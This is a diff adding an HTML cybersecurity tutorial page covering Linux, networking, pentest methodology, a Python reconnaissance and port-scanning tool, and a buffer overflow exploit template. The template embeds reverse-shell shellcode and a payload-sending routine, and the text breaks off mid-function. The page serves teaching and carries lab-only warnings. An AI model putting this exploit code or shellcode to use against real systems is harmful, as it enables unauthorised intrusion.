@@ -1,0 +1,1870 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Cybersecurity | Gaut1ham</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.3.0/mermaid.min.js"></script>
+    <script>
+        hljs.highlightAll();
+        mermaid.initialize({ 
+            startOnLoad: true,
+            theme: 'dark',
+            securityLevel: 'loose'
+        });
+    </script>
+    <style>
+        :root {
+            --primary-color: #0d1117;
+            --secondary-color: #161b22;
+            --accent-color: #238636;
+            --danger-color: #f85149;
+            --warning-color: #f0883e;
+            --info-color: #58a6ff;
+            --text-color: #c9d1d9;
+            --border-color: #30363d;
+            --code-bg: #1e1e1e;
+            --terminal-bg: #000000;
+            --terminal-green: #00ff00;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Consolas', 'Monaco', monospace;
+        }
+
+        body {
+            background-color: var(--primary-color);
+            color: var(--text-color);
+            line-height: 1.8;
+            overflow-x: hidden;
+            counter-reset: section;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 2rem;
+        }
+
+        /* Sidebar Navigation */
+        .sidebar {
+            position: sticky;
+            top: 20px;
+            height: calc(100vh - 40px);
+            overflow-y: auto;
+            background: var(--secondary-color);
+            border-radius: 10px;
+            padding: 2rem 1rem;
+            border: 1px solid var(--border-color);
+        }
+
+        .sidebar-header {
+            text-align: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .sidebar-header h2 {
+            color: var(--accent-color);
+            font-size: 1.5rem;
+        }
+
+        .sidebar-header .username {
+            color: var(--info-color);
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+        }
+
+        .nav-section {
+            margin-bottom: 2rem;
+        }
+
+        .nav-title {
+            color: var(--warning-color);
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 1rem;
+            padding-left: 0.5rem;
+        }
+
+        .nav-list {
+            list-style: none;
+        }
+
+        .nav-list li {
+            margin-bottom: 0.5rem;
+        }
+
+        .nav-list a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            padding: 0.8rem;
+            border-radius: 5px;
+            transition: all 0.3s;
+            font-size: 0.95rem;
+        }
+
+        .nav-list a:hover {
+            background: rgba(35, 134, 54, 0.1);
+            color: var(--accent-color);
+            border-left: 3px solid var(--accent-color);
+        }
+
+        .nav-list a.active {
+            background: rgba(35, 134, 54, 0.2);
+            color: var(--accent-color);
+            border-left: 3px solid var(--accent-color);
+        }
+
+        .nav-list i {
+            width: 20px;
+            text-align: center;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 2rem 0;
+        }
+
+        .chapter {
+            margin-bottom: 4rem;
+            scroll-margin-top: 20px;
+        }
+
+        .chapter-header {
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 2px solid var(--border-color);
+            position: relative;
+        }
+
+        .chapter-header::before {
+            counter-increment: section;
+            content: counter(section) ". ";
+            color: var(--accent-color);
+            font-size: 2rem;
+            font-weight: bold;
+            position: absolute;
+            left: -50px;
+            top: -10px;
+        }
+
+        .chapter-title {
+            font-size: 2.2rem;
+            color: var(--accent-color);
+            margin-bottom: 0.5rem;
+        }
+
+        .chapter-subtitle {
+            color: var(--warning-color);
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+        }
+
+        /* Content Cards */
+        .card {
+            background: var(--secondary-color);
+            border-radius: 10px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            border: 1px solid var(--border-color);
+            transition: transform 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: var(--accent-color);
+        }
+
+        .card-title {
+            color: var(--info-color);
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .card-title i {
+            color: var(--accent-color);
+        }
+
+        /* Terminal Simulation */
+        .terminal {
+            background: var(--terminal-bg);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #333;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #333;
+        }
+
+        .terminal-dots {
+            display: flex;
+            gap: 0.5rem;
+            margin-right: 1rem;
+        }
+
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .terminal-dot.red { background: #ff5f56; }
+        .terminal-dot.yellow { background: #ffbd2e; }
+        .terminal-dot.green { background: #27c93f; }
+
+        .terminal-title {
+            color: #888;
+            font-size: 0.9rem;
+        }
+
+        .terminal-content {
+            color: var(--terminal-green);
+            line-height: 1.6;
+        }
+
+        .terminal-prompt {
+            color: #58a6ff;
+        }
+
+        .terminal-command {
+            color: var(--terminal-green);
+        }
+
+        .terminal-output {
+            color: #ccc;
+            margin-left: 1rem;
+        }
+
+        /* Code Blocks */
+        .code-container {
+            background: var(--code-bg);
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+        }
+
+        .code-header {
+            background: var(--secondary-color);
+            padding: 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .code-language {
+            color: var(--accent-color);
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+        }
+
+        .copy-btn {
+            background: none;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent-color);
+            border-color: var(--accent-color);
+        }
+
+        pre {
+            margin: 0;
+            padding: 1.5rem;
+            overflow-x: auto;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+
+        /* Diagrams */
+        .diagram-container {
+            background: var(--secondary-color);
+            border-radius: 10px;
+            padding: 2rem;
+            margin: 2rem 0;
+            border: 1px solid var(--border-color);
+            text-align: center;
+        }
+
+        .mermaid {
+            background: white;
+            padding: 1rem;
+            border-radius: 8px;
+        }
+
+        /* Tables */
+        .table-container {
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--secondary-color);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th {
+            background: var(--primary-color);
+            color: var(--accent-color);
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        td {
+            padding: 1rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        tr:hover {
+            background: rgba(35, 134, 54, 0.1);
+        }
+
+        /* Warning Boxes */
+        .warning-box {
+            background: rgba(248, 81, 73, 0.1);
+            border-left: 4px solid var(--danger-color);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .warning-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            color: var(--danger-color);
+        }
+
+        .note-box {
+            background: rgba(88, 166, 255, 0.1);
+            border-left: 4px solid var(--info-color);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .note-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            color: var(--info-color);
+        }
+
+        /* Command Reference */
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .command-item {
+            background: var(--secondary-color);
+            border-radius: 8px;
+            padding: 1rem;
+            border: 1px solid var(--border-color);
+        }
+
+        .command-item .command {
+            color: var(--terminal-green);
+            font-family: 'Courier New', monospace;
+            margin-bottom: 0.5rem;
+        }
+
+        .command-item .description {
+            color: #8b949e;
+            font-size: 0.9rem;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+            
+            .sidebar {
+                position: static;
+                height: auto;
+                margin-bottom: 2rem;
+            }
+            
+            .chapter-header::before {
+                position: static;
+                display: inline;
+                margin-right: 1rem;
+            }
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .chapter {
+            animation: fadeIn 0.5s ease-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Sidebar Navigation -->
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <h2>Cybersecurity Hub</h2>
+                <div class="username">@gaut1ham</div>
+                <div style="margin-top: 1rem; font-size: 0.8rem; color: #8b949e;">
+                    <i class="fas fa-shield-alt"></i> Security Engineer
+                </div>
+            </div>
+
+            <div class="nav-section">
+                <div class="nav-title">Fundamentals</div>
+                <ul class="nav-list">
+                    <li><a href="#linux-basics" class="active"><i class="fab fa-linux"></i> Linux Fundamentals</a></li>
+                    <li><a href="#networking"><i class="fas fa-network-wired"></i> Networking Core</a></li>
+                    <li><a href="#terminal-mastery"><i class="fas fa-terminal"></i> Terminal Mastery</a></li>
+                    <li><a href="#file-system"><i class="fas fa-folder"></i> File System Hierarchy</a></li>
+                </ul>
+            </div>
+
+            <div class="nav-section">
+                <div class="nav-title">Advanced Topics</div>
+                <ul class="nav-list">
+                    <li><a href="#methodology"><i class="fas fa-chess"></i> Hacking Methodology</a></li>
+                    <li><a href="#enumeration"><i class="fas fa-search"></i> Reconnaissance & Enumeration</a></li>
+                    <li><a href="#exploitation"><i class="fas fa-bug"></i> Exploitation Techniques</a></li>
+                    <li><a href="#post-exploitation"><i class="fas fa-user-secret"></i> Post-Exploitation</a></li>
+                </ul>
+            </div>
+
+            <div class="nav-section">
+                <div class="nav-title">Technical Deep Dive</div>
+                <ul class="nav-list">
+                    <li><a href="#memory"><i class="fas fa-microchip"></i> Memory & Processes</a></li>
+                    <li><a href="#networking-deep"><i class="fas fa-project-diagram"></i> Networking Internals</a></li>
+                    <li><a href="#cryptography"><i class="fas fa-lock"></i> Cryptography Basics</a></li>
+                    <li><a href="#web-security"><i class="fas fa-globe"></i> Web Security</a></li>
+                </ul>
+            </div>
+
+            <div class="nav-section">
+                <div class="nav-title">Lab & Practice</div>
+                <ul class="nav-list">
+                    <li><a href="#lab-setup"><i class="fas fa-flask"></i> Lab Environment Setup</a></li>
+                    <li><a href="#ctf-guide"><i class="fas fa-flag"></i> CTF Walkthroughs</a></li>
+                    <li><a href="#tools-deep"><i class="fas fa-tools"></i> Advanced Tools</a></li>
+                    <li><a href="#scripting"><i class="fas fa-code"></i> Security Scripting</a></li>
+                </ul>
+            </div>
+
+            <div class="nav-section">
+                <div class="nav-title">Ethics & Career</div>
+                <ul class="nav-list">
+                    <li><a href="#responsible"><i class="fas fa-balance-scale"></i> Responsible Disclosure</a></li>
+                    <li><a href="#legal"><i class="fas fa-gavel"></i> Legal Framework</a></li>
+                    <li><a href="#career"><i class="fas fa-briefcase"></i> Career Path</a></li>
+                    <li><a href="#certifications"><i class="fas fa-certificate"></i> Certifications</a></li>
+                </ul>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Chapter 1: Linux Fundamentals -->
+            <section id="linux-basics" class="chapter">
+                <div class="chapter-header">
+                    <h1 class="chapter-title">Linux Fundamentals</h1>
+                    <div class="chapter-subtitle">Mastering the Hacker's Operating System</div>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fab fa-linux"></i> Why Linux for Security?</h2>
+                    <p>Linux is the foundation of modern cybersecurity operations. Understanding it is non-negotiable for any security professional.</p>
+                    
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <div class="terminal-dots">
+                                <span class="terminal-dot red"></span>
+                                <span class="terminal-dot yellow"></span>
+                                <span class="terminal-dot green"></span>
+                            </div>
+                            <div class="terminal-title">root@kali:~</div>
+                        </div>
+                        <div class="terminal-content">
+                            <span class="terminal-prompt">#</span> <span class="terminal-command">whoami</span><br>
+                            <span class="terminal-output">root</span><br><br>
+                            
+                            <span class="terminal-prompt">#</span> <span class="terminal-command">uname -a</span><br>
+                            <span class="terminal-output">Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC ...</span><br><br>
+                            
+                            <span class="terminal-prompt">#</span> <span class="terminal-command">ls -la /</span><br>
+                            <span class="terminal-output">drwxr-xr-x  20 root root  4096 Dec  1 00:00 .<br>
+                            drwxr-xr-x  20 root root  4096 Dec  1 00:00 ..<br>
+                            drwxr-xr-x   2 root root  4096 Dec  1 00:00 bin<br>
+                            drwxr-xr-x   4 root root  4096 Dec  1 00:00 boot<br>
+                            drwxr-xr-x  19 root root  3980 Dec  1 00:00 dev<br>
+                            drwxr-xr-x 150 root root 12288 Dec  1 00:00 etc</span>
+                        </div>
+                    </div>
+
+                    <div class="command-grid">
+                        <div class="command-item">
+                            <div class="command">ls -la</div>
+                            <div class="description">List all files with details (permissions, size, date)</div>
+                        </div>
+                        <div class="command-item">
+                            <div class="command">chmod 755 file</div>
+                            <div class="description">Change file permissions (rwx for owner, r-x for others)</div>
+                        </div>
+                        <div class="command-item">
+                            <div class="command">sudo -i</div>
+                            <div class="description">Switch to root user (superuser do)</div>
+                        </div>
+                        <div class="command-item">
+                            <div class="command">ps aux | grep process</div>
+                            <div class="description">Find running processes</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-key"></i> File Permissions Deep Dive</h2>
+                    <p>Understanding Linux permissions is critical for both offensive and defensive security.</p>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">Linux Permissions</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code class="bash"># Permission Structure:
+# rwx rwx rwx
+# │││ │││ │││
+# │││ │││ └── Others (o)
+# │││ └┴┴──── Group (g)
+# └┴┴──────── Owner (u)
+
+# Numeric Representation:
+# r = 4, w = 2, x = 1
+# rwx = 4+2+1 = 7
+# r-x = 4+0+1 = 5
+# r-- = 4+0+0 = 4
+
+# Common permissions:
+chmod 755 script.sh    # rwxr-xr-x (owner: rwx, others: r-x)
+chmod 644 file.txt     # rw-r--r-- (owner: rw-, others: r--)
+chmod 600 secret.key   # rw------- (owner only)
+
+# Special permissions:
+chmod +s file          # Set SUID/SGID
+chmod +t dir           # Sticky bit (only owner can delete)</code></pre>
+                    </div>
+
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Permission</th>
+                                    <th>File</th>
+                                    <th>Directory</th>
+                                    <th>Security Impact</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><code>r</code> (read)</td>
+                                    <td>View file contents</td>
+                                    <td>List directory contents</td>
+                                    <td>Information disclosure</td>
+                                </tr>
+                                <tr>
+                                    <td><code>w</code> (write)</td>
+                                    <td>Modify file contents</td>
+                                    <td>Create/delete files in dir</td>
+                                    <td>Data corruption, malware</td>
+                                </tr>
+                                <tr>
+                                    <td><code>x</code> (execute)</td>
+                                    <td>Run as program</td>
+                                    <td>Access directory entries</td>
+                                    <td>Code execution</td>
+                                </tr>
+                                <tr>
+                                    <td><code>s</code> (SUID)</td>
+                                    <td>Run as file owner</td>
+                                    <td>-</td>
+                                    <td>Privilege escalation</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Chapter 2: Networking Core -->
+            <section id="networking" class="chapter">
+                <div class="chapter-header">
+                    <h1 class="chapter-title">Networking Fundamentals</h1>
+                    <div class="chapter-subtitle">How Data Flows Across Networks</div>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-sitemap"></i> OSI Model & TCP/IP Stack</h2>
+                    
+                    <div class="diagram-container">
+                        <div class="mermaid">
+                            graph TD
+                                A[Application Layer<br>HTTP, FTP, DNS] --> B[Transport Layer<br>TCP, UDP]
+                                B --> C[Network Layer<br>IP, ICMP]
+                                C --> D[Data Link Layer<br>MAC, ARP]
+                                D --> E[Physical Layer<br>Cables, Signals]
+                                
+                                F[Attacker] -->|"Port Scan<br>(Layer 4)"| B
+                                G[Attacker] -->|"IP Spoofing<br>(Layer 3)"| C
+                                H[Attacker] -->|"ARP Poisoning<br>(Layer 2)"| D
+                        </div>
+                    </div>
+
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">Network Analysis</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code class="python"># Python socket programming - Understanding layers
+import socket
+import struct
+
+# Layer 4: TCP connection
+def tcp_scan(target, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex((target, port))
+    sock.close()
+    return result == 0
+
+# Layer 3: IP packet creation
+def create_ip_packet(src_ip, dst_ip):
+    # IP Header fields
+    ip_ver = 4
+    ip_ihl = 5
+    ip_tos = 0
+    ip_tot_len = 0
+    ip_id = 54321
+    ip_frag_off = 0
+    ip_ttl = 255
+    ip_proto = socket.IPPROTO_TCP
+    ip_check = 0
+    ip_saddr = socket.inet_aton(src_ip)
+    ip_daddr = socket.inet_aton(dst_ip)
+    
+    ip_ihl_ver = (ip_ver << 4) + ip_ihl
+    
+    # Pack the IP header
+    ip_header = struct.pack('!BBHHHBBH4s4s',
+        ip_ihl_ver, ip_tos, ip_tot_len,
+        ip_id, ip_frag_off, ip_ttl,
+        ip_proto, ip_check, ip_saddr, ip_daddr)
+    
+    return ip_header</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-broadcast-tower"></i> Packet Analysis with Scapy</h2>
+                    
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <div class="terminal-dots">
+                                <span class="terminal-dot red"></span>
+                                <span class="terminal-dot yellow"></span>
+                                <span class="terminal-dot green"></span>
+                            </div>
+                            <div class="terminal-title">Scapy Interactive</div>
+                        </div>
+                        <div class="terminal-content">
+                            <span class="terminal-prompt">>>></span> <span class="terminal-command">from scapy.all import *</span><br>
+                            <span class="terminal-prompt">>>></span> <span class="terminal-command">packet = IP(dst="192.168.1.1")/ICMP()/"Hello"</span><br>
+                            <span class="terminal-output">Creating ICMP packet to 192.168.1.1</span><br><br>
+                            
+                            <span class="terminal-prompt">>>></span> <span class="terminal-command">packet.show()</span><br>
+                            <span class="terminal-output">###[ IP ]###<br>
+  version   = 4<br>
+  ihl       = None<br>
+  tos       = 0x0<br>
+  len       = None<br>
+  id        = 1<br>
+  flags     = <br>
+  frag      = 0<br>
+  ttl       = 64<br>
+  proto     = icmp<br>
+  chksum    = None<br>
+  src       = 192.168.1.100<br>
+  dst       = 192.168.1.1</span><br><br>
+                            
+                            <span class="terminal-prompt">>>></span> <span class="terminal-command">send(packet)</span><br>
+                            <span class="terminal-output">Sent 1 packet.</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Chapter 3: Hacking Methodology -->
+            <section id="methodology" class="chapter">
+                <div class="chapter-header">
+                    <h1 class="chapter-title">Advanced Hacking Methodology</h1>
+                    <div class="chapter-subtitle">The Professional Approach to Security Testing</div>
+                </div>
+
+                <div class="warning-box">
+                    <div class="warning-header">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <h3>Legal & Ethical Warning</h3>
+                    </div>
+                    <p>These methodologies are for <strong>authorized security testing only</strong>. Always obtain written permission before testing any system.</p>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-chess"></i> PTES - Penetration Testing Execution Standard</h2>
+                    
+                    <div class="diagram-container">
+                        <div class="mermaid">
+                            graph LR
+                                A[Pre-engagement] --> B[Intelligence Gathering]
+                                B --> C[Threat Modeling]
+                                C --> D[Vulnerability Analysis]
+                                D --> E[Exploitation]
+                                E --> F[Post-Exploitation]
+                                F --> G[Reporting]
+                                
+                                style A fill:#238636
+                                style G fill:#f85149
+                        </div>
+                    </div>
+
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Phase</th>
+                                    <th>Activities</th>
+                                    <th>Tools</th>
+                                    <th>Deliverables</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>1. Reconnaissance</td>
+                                    <td>Passive/Active info gathering</td>
+                                    <td>theHarvester, Maltego, Shodan</td>
+                                    <td>Asset inventory, Network map</td>
+                                </tr>
+                                <tr>
+                                    <td>2. Scanning</td>
+                                    <td>Port scanning, Service detection</td>
+                                    <td>Nmap, Masscan, Nikto</td>
+                                    <td>Open ports, Services, Versions</td>
+                                </tr>
+                                <tr>
+                                    <td>3. Enumeration</td>
+                                    <td>Extract detailed information</td>
+                                    <td>Enum4linux, SNMPwalk, LDAP search</td>
+                                    <td>Users, Shares, Configurations</td>
+                                </tr>
+                                <tr>
+                                    <td>4. Vulnerability Analysis</td>
+                                    <td>Identify weaknesses</td>
+                                    <td>Nessus, OpenVAS, Nuclei</td>
+                                    <td>Vulnerability report</td>
+                                </tr>
+                                <tr>
+                                    <td>5. Exploitation</td>
+                                    <td>Gain unauthorized access</td>
+                                    <td>Metasploit, SQLmap, Burp Suite</td>
+                                    <td>System access, Proof of concept</td>
+                                </tr>
+                                <tr>
+                                    <td>6. Post-Exploitation</td>
+                                    <td>Maintain access, Lateral movement</td>
+                                    <td>Mimikatz, BloodHound, Empire</td>
+                                    <td>Domain admin, Data exfil</td>
+                                </tr>
+                                <tr>
+                                    <td>7. Reporting</td>
+                                    <td>Document findings</td>
+                                    <td>Dradis, Serpico, Word</td>
+                                    <td>Final report, Executive summary</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-crosshairs"></i> Advanced Reconnaissance Techniques</h2>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">Python OSINT Tool</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+<pre><code class="python">import requests
+import dns.resolver
+import whois
+import socket
+from bs4 import BeautifulSoup
+
+class AdvancedRecon:
+    def __init__(self, target):
+        self.target = target
+        self.results = {}
+    
+    def dns_enumeration(self):
+        """Enumerate DNS records"""
+        records = {}
+        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
+        
+        for record in record_types:
+            try:
+                answers = dns.resolver.resolve(self.target, record)
+                records[record] = [str(rdata) for rdata in answers]
+            except:
+                continue
+        
+        self.results['dns'] = records
+        return records
+    
+    def subdomain_discovery(self, wordlist):
+        """Brute force subdomains"""
+        found = []
+        with open(wordlist, 'r') as f:
+            subdomains = [line.strip() for line in f]
+        
+        for sub in subdomains:
+            domain = f"{sub}.{self.target}"
+            try:
+                socket.gethostbyname(domain)
+                found.append(domain)
+                print(f"[+] Found: {domain}")
+            except socket.gaierror:
+                continue
+        
+        self.results['subdomains'] = found
+        return found
+    
+    def whois_lookup(self):
+        """Get WHOIS information"""
+        try:
+            w = whois.whois(self.target)
+            self.results['whois'] = {
+                'registrar': w.registrar,
+                'creation_date': w.creation_date,
+                'expiration_date': w.expiration_date,
+                'name_servers': w.name_servers,
+                'emails': w.emails
+            }
+            return self.results['whois']
+        except:
+            return None
+    
+    def port_scan(self, ports=[21,22,23,25,53,80,443,445,3306,3389]):
+        """Scan common ports"""
+        open_ports = []
+        for port in ports:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((self.target, port))
+            sock.close()
+            if result == 0:
+                open_ports.append(port)
+                print(f"[+] Port {port} is OPEN")
+        
+        self.results['open_ports'] = open_ports
+        return open_ports
+    
+    def web_technologies(self):
+        """Detect web technologies"""
+        tech = {}
+        try:
+            resp = requests.get(f"http://{self.target}", timeout=5)
+            headers = resp.headers
+            
+            # Check common headers
+            if 'Server' in headers:
+                tech['server'] = headers['Server']
+            if 'X-Powered-By' in headers:
+                tech['powered_by'] = headers['X-Powered-By']
+            
+            # Check for common frameworks in HTML
+            soup = BeautifulSoup(resp.text, 'html.parser')
+            
+            # Check for WordPress
+            if 'wp-content' in resp.text or 'wp-includes' in resp.text:
+                tech['cms'] = 'WordPress'
+            
+            # Check for jQuery
+            if 'jquery' in resp.text.lower():
+                tech['javascript'] = 'jQuery'
+            
+            self.results['technologies'] = tech
+            return tech
+        except:
+            return None
+
+# Usage
+if __name__ == "__main__":
+    recon = AdvancedRecon("example.com")
+    print("Starting reconnaissance...")
+    recon.dns_enumeration()
+    recon.whois_lookup()
+    recon.port_scan()
+    recon.web_technologies()
+    
+    print("\n[+] Results:")
+    for key, value in recon.results.items():
+        print(f"{key}: {value}")</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Chapter 4: Exploitation Techniques -->
+            <section id="exploitation" class="chapter">
+                <div class="chapter-header">
+                    <h1 class="chapter-title">Exploitation Techniques</h1>
+                    <div class="chapter-subtitle">Gaining Unauthorized Access Systematically</div>
+                </div>
+
+                <div class="note-box">
+                    <div class="note-header">
+                        <i class="fas fa-lightbulb"></i>
+                        <h3>Important Note</h3>
+                    </div>
+                    <p>These techniques should only be practiced in controlled lab environments like VulnHub, HackTheBox, or TryHackMe.</p>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-bug"></i> Common Exploitation Vectors</h2>
+                    
+                    <div class="diagram-container">
+                        <div class="mermaid">
+                            graph TD
+                                A[Initial Access] --> B{Exploitation Vector}
+                                B --> C[Buffer Overflow]
+                                B --> D[SQL Injection]
+                                B --> E[XSS/CSRF]
+                                B --> F[File Inclusion]
+                                B --> G[Command Injection]
+                                
+                                C --> H[Shellcode Execution]
+                                D --> I[Database Dump]
+                                E --> J[Session Hijacking]
+                                F --> K[Arbitrary File Read]
+                                G --> L[RCE]
+                                
+                                H --> M[Reverse Shell]
+                                I --> N[Credential Theft]
+                                J --> O[Account Takeover]
+                                K --> P[Sensitive Data]
+                                L --> Q[Full System Control]
+                                
+                                M --> R[Post-Exploitation]
+                                N --> R
+                                O --> R
+                                P --> R
+                                Q --> R
+                        </div>
+                    </div>
+
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">Python Exploit Example</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+<pre><code class="python">#!/usr/bin/env python3
+"""
+Buffer Overflow Exploit Template
+Educational purposes only
+"""
+
+import socket
+import struct
+import sys
+
+class BufferOverflowExploit:
+    def __init__(self, target_ip, target_port):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.buffer = b"A" * 1000  # Placeholder
+    
+    def create_pattern(self, length):
+        """Create De Bruijn pattern for offset discovery"""
+        pattern = b""
+        chars = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        chars += b"abcdefghijklmnopqrstuvwxyz"
+        chars += b"0123456789"
+        
+        for i in range(length):
+            pattern += bytes([chars[i % len(chars)]])
+        
+        return pattern
+    
+    def find_eip_offset(self, pattern_length=1000):
+        """Find EIP offset using pattern"""
+        pattern = self.create_pattern(pattern_length)
+        print(f"[*] Generated pattern of {len(pattern)} bytes")
+        return pattern
+    
+    def generate_shellcode(self, lhost, lport):
+        """Generate reverse shell shellcode (msfvenom style)"""
+        # Linux x86 reverse shell
+        shellcode = (
+            b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"  # Zero registers
+            b"\xb0\x66\xb3\x01\x51\x6a\x06\x6a"  # Socket syscall
+            b"\x01\x6a\x02\x89\xe1\xcd\x80\x89"  # Create socket
+            b"\xc6\xb0\x66\x31\xdb\x53\x66\x68"  # Connect
+            b"\x11\x5c\x66\x6a\x02\x89\xe1\x6a"  # Port 4444
+            b"\x10\x51\x56\x89\xe1\xb3\x03\xcd"  # Connect syscall
+            b"\x80\x31\xc9\xb1\x03\xfe\xc9\xb0"  # Dup2 loop
+            b"\x3f\xcd\x80\x75\xf8\x31\xc0\x52"  # Execve
+            b"\x68\x2f\x2f\x73\x68\x68\x2f\x62"  # /bin//sh
+            b"\x69\x6e\x89\xe3\x52\x53\x89\xe1"  # Execute
+            b"\xb0\x0b\xcd\x80"                  # Syscall
+        )
+        return shellcode
+    
+    def exploit(self, offset, eip, shellcode):
+        """Craft final exploit"""
+        # Buffer structure: [JUNK] + [EIP] + [NOPS] + [SHELLCODE]
+        junk = b"A" * offset
+        nops = b"\x90" * 100  # NOP sled
+        
+        payload = junk
+        payload += struct.pack("<I", eip)  # Little endian
+        payload += nops
+        payload += shellcode
+        
+        return payload
+    
+    def send_exploit(self, payload):
+        """Send exploit to target"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((self.target_ip, self.target_port))
+            
+            # Receive banner
+            banner = sock.recv(1024)
+            print(f"[*] Banner: {banner}")
+            
+            # Send payload
